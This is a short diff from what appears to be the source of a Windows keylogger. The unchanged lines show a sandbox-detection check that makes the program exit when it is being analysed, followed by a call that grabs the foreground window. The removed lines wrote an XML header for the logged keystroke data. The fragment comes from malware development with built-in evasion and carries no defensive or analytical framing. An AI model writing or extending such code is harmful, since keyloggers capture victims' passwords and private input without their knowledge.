@@ -506,11 +506,6 @@ int main()
     */
     if(SandBoxDetection()) return SandBoxedInstance;
     /*
-        display an xml header to generate the end document.
-    */
-    current_process_data = writeUnsanitizedBuffer(current_process_data,
-    "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n");
-    /*
         grab a handle to the foreground process.
     */
     HWND CURRENTPROCEESS=GetForegroundWindow();
